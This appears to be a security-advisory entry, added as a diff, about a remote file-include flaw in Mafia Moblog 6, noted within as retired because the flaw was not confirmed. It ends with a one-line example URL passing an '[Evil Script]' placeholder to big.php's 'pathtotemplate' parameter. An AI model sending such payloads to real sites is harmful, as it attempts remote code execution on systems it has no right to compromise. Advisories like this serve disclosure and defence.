@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/19458/info
+
+Mafia Moblog is prone to a remote file-include vulnerability because it fails to properly sanitize user-supplied input.
+
+An attacker can exploit this issue to include an arbitrary remote file containing malicious PHP code and execute it in the context of the webserver process. This may facilitate a compromise of the application and the underlying system; other attacks are also possible.
+
+Version 6 is vulnerable to this issue; other versions may also be affected.
+
+Update: After further analysis, this BID is being retired. The 'pathtotemplate' variable is defined in the 'template.php' file prior to its use in the affected script.
+
+http://www.example.com/[Mafia Moblog]/big.php?pathtotemplate=[Evil Script]
